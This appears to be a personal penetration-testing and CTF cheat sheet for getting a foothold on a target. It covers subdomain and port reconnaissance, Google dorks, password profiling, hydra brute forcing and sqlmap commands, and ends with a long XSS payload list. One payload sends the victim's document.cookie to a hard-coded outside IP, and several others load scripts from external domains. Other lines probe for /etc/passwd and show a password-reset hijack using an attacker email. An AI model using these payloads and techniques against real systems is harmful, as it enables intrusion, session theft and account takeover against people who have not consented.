https://www.harmj0y.net/blog/page/2/
This is things to-do to get basic shell


```
Recon is king, while recon-ing make a 'to try' list and keeep filling it in priority order
if dont have exact version, put in back of `todo list`.Like password brute,openssh version old, apache attacks, put in back of list.
Things with high priority : if some known cms is running,dirbuster etc
```

```
RFC pop3 : finding how anything works
```

```
we can connect to any service using ssl as follow:

openssl s_client -connect IP:PORT
```

```
tcpdump -i eth0 -m
```


# Recon

## First collect all subdomains 

Increase scope first by getting sub domains

* Getting subdomain
		
	* use automated tools like `Aquatone & Sublister` to brute force subdomain
	* use `shodan`, `crt.sh`, `virustotal`
	* use online sites
	* try : `bitbucket.site.com, admin.site.com`
	* google dorking
	* Using DIG 
		* `dig any IP` : Use to get nameservers, A records and lookups .
		* `dig axfr @nameServer IP` is zone transfer request which is possible gives all sub domain
	
	* dns lookup
		* Reverse DNS
			* `host 10.11.1.123` might give host name
		* Forward DNS
			* `host site.com` , gives us IP. this is forward
		* Try this
			* if u get IP for site.com as 10.10.10.13, then `host 10.10.10.13` gives us `site.com`.So `for i in {0..255};do host 10.10.10.$i; done`



## NMAP & NIKTO & DIRBUSTER all at once(background them)

### Nikto
`nikto -h google.com`

### Dirbuster

* site.com/dirSearch
	* first try `(README/readme/version/changelog)`.`(md,txt,html,htm)`
	* also try `/app.js, server.js, about_us.js`
	* dirsearch first using my worklist 1st,
		* some extions to always keep `-e bak,txt` + whtever html,htm ect
	* Then gobuster with wordlist-2.3.medium.
	**if in dirsearch result gives 0bytes in return, try fuzzing paramters wfuzz.**

### NMAP
* First step(default script on top 1000 ports and default scripts)
```
nmap -sV -sC -oA nmapScan/result 10.10.10.10
AND
nmap -sU -vvv nmapScan/result 10.10.10.10
```

* Use all scripts on top 1000 ports
nmap -sV --script all -oA nmapScan/result 10.10.10.10 ( can take an hour )

> bcz the above one is very slow, -p- sei get open ports and run `nmap -sC -sV --script vuln -p x,y,z,a,b IP`

* If no result above try all 65K ports
	* nmap -p- -T4 --max-retries 0 -v -oA nmap/allPortsResult 10.10.10.10
> suppose we get port 1888 open, then we can deep scan it
	* nmap -p 1888 -sV -sC 10.10.10.10


* You can try to guess OS based on enumerted banners.



## MORE RECON


* PHP, apache, aspx, anything can be vulnerable not just application running but the server itself, so enumerating these and also but them in `to try list` with low priority. 

* checks information in certificates. can get u usernames etc for brute forcing

* `Whois` command again to get usernames location etc.

* if some evil file exist site.com/evilfile, check for 
```
site.com/getPost.bak
site.com/getPost.tar
site.com/getPost.zip/rar
site.com/getPost
site.com/~getPost
site.com/.getPost.save
site.com/.getPost.swp
site.com/.getPost.php.save
/log.txt
```

* google dorkin
	* `site:*.microsoft.com` `-www` `filtype:ppt` `inurl` `intitle`
	* `inurl:php? intext:CHARACTER_SETS intitle:phpmyadmin inurl:.in` WOW
	* `inurl:./well-known/security.txt`
	* `site:<target> intitle:"index of"`
	* `site:<target> inurl:service ext:php`
	* `site:<target> intext:"authentication" intranet password login inurl:account ext:(doc|pdf|xls|psw|ppt|pps|xml|txt|ps|rtf|odt|sxw|xlsx|docx|mail)`
	* `for open redirects : inurl:redirectUrl=http site:<target>`
	* https://www.exploit-db.com/google-hacking-database

* Password profiling 
	* cewl www.site.com -m 6 -w customPasswordList.txt
	* check whois
	* certificates
	* Cached web pages
	* Then manually try mutate password 
	* Passwords found from databases, databases password itself etc.
	**Use these password to bruteforce things like**
		* root password
		* some admin user login
		* ssh 


# Firewall escaping techniques 
* site.com/?q="\x00-\xff" and find not valid characters . used to find blacklist if you see not allowed characters.

# Attacks to try everywhere


* Create user with name as `/login` and if that can somehow break flow anywhere
* Try OPTIONS for  PuT,POST, GET , DELETE Request
* start burp crawler 
* Check randomness of any ID(CSRF/SessionID/AnyId)



## Query Attacks

* site.com/?q=x
* site.com/?q=<img> => test for xss
* site.com/?q=http://IP:PORT => test for ssrf
* site.com/?q=file:///etc/passwd => file include
* site.com/?q=../../../../index.php => info disclosure
* site.com/?q=x'
* site.com/?q=x"
* site.com/?q=x; => interseting if all is good;
* site.com/?q[]=x
* site.com/?   NOT_SENDING_param_AT_ALL
* Parameter pollution


## Sqlmap


* Look for sqli in cookie thats looks odd
* Sqlmap backgroud par bhjdo
```
If you got a position of attack
sqlmap -r file.postReq

If you got specific parameter of attack(use *)
sqlmap -u site.com/?q=*

If you have nothing
sqlmap -u site.com --crawl 1

```

## Content Types

## File Uploads
> donot look for shell if uploaded image goes into s3/other server
> try to upload svg, or break sanitization like
	* a.'svg
	* a.png.svg

## XSS

## SSRF

## ACAO/CORS

## IDOR

## CSRF

## Buisness logic flaw

## Login flaws

1. reuseable OTP/link
	* If OTP/link used while login can be reused later
2. Changinf respone
	* If there is some basic response like status ok,userId 123 and no encrypted token returned, we can manipulate to next page
3. use email X to get OTP and confirm using email Y
4. in passowrd reset link, where it asks useremail to reset password of, send an array : 
	* `POST --data  "{email : [validUser@email.com, evil@attacker.com ]}" `,could maybe allow evil to reset validUser's password

## Hidden GET/POST parameters in hidden forms

## CRLF

```
site inurl:locale=
site inurl:lang=
```
because language parameter are reflected in cookies , \r\n might get crlf

## Password brute forcing

```
try:
admin/admin , admin/"" , admin/password , root/root , root/"" , root/password , admin/sitesNames

if username is knows : 
	username/username ,  username/emanresu(reverse) , username/username123

and

WEB

hydra -s 10000 -e nsr -l admin -P ~/Desktop/ctf/____tools____/seclist/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.120 http-post-form/http-get-form "/session_login.cgi:user=^USER^&pass=^PASS^:failed"

here -s is port/ optional

```


## CMS

### Wp-Scan

```
docker run -it --rm wpscanteam/wpscan --url https://target.tld/ -e vt,tt,u,ap
```

### Magento

run `php ~/Desktop/ctf/____tools____/cms/magento/magescan.phar scan:all site.com/index.php/`

just exploit-db for magento, there are 10-11 exploits there, try em all.




# Xss Payload

```

<svg onload='z="http://52.26.23.151:9999/?x="+document.cookie;z1=new XMLHttpRequest();z1.open("get",z);z1.send() '>

site.com/#<XSS>

<svgonload=alert(1)>



jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

"><a href="#" data-abc\"="foo">abc</a><a href="#" data-\u00B7._="foo">abc</a>1<template><s>000</s></template>2<b>{{evil<script>alert(1)</script><form><img src=x name=textContent></form>}}</b><option><style></option></select><b><img src=xx: onerror=alert(1)></style></option><svg onload="prompt(/xss/);"><!-- <script>void(%27&b=%27);alert(%27XSS%27);</script> </textarea> </textarea>#<img/src/onerror=alert(123)> "><script>confirm(1)</script> c <!--jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//\x3e--> " onclick="alert(1)


</div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>

<lol/onauxclick=[0].some(alert) >RightClickToXss

<d3v/onmouseleave=[2].some(confirm)>click

<a/~/ href='s'>test</a>

<details/open/ontoggle=alert()>

<details/open/ontoggle=(confirm)()//

<a"/onclick=(confirm)()>click

<a/href=&#74;ava%0a%0d%09script&colon;alert()>click

<d3v/onauxclick=(((confirm)))``>click

<xmp><p title="</xmp><script>alert`1`</script>">

<svg </onload ="1> (_=prompt,_(1)) "">

<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>

URL's

<a href="java%0ascript:alert(1)">

<a href="data:text/html,<script>alert(document.domain)</script>">click</a> [firefox]

<iframe src="data:text/html;alert(1);base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=" />
	[URL 		= data:[<mediatype>][;base64],<data> 
	 mediatype 	= text/html;anything;base64;<data>]

<a href=&#74;avascript&colon;alert(1)>test2</a>

<a href=/\///\\/example.com/xss.js>URL bypass</a>

<iframe srcdoc="&lt;svg/onload=alert()&gt;">

<a/href=javascript&colon;alert()>click

```









